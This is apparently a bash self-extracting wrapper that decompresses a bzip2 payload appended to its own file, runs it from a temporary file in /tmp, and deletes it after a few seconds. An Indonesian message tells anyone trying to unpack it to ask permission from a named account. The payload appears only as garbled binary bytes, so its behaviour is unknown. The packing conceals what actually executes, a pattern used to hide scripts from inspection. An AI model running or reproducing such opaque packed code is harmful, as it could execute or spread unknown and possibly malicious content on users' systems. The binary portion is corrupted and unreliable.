#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY���p  ?߀|�
 @����05��$�2yF��z� � d ���{T���@z��4	SE=M�4��SM�  ����4�s$�s� �@�9��E��m��a4��U4>����<�rCM��Tq
		Y%����$�%�啙��/��bQ(������f��`�F�e�z
�_C�������]=��e8�A�D�I��V���`�N�l������߮
�ʷ�"XXd�!P/@,���	�
�5C�` �=4�HE"�A0�N��T\�>�;,��y�
���N� d�:�+��ܑN$/|�\ 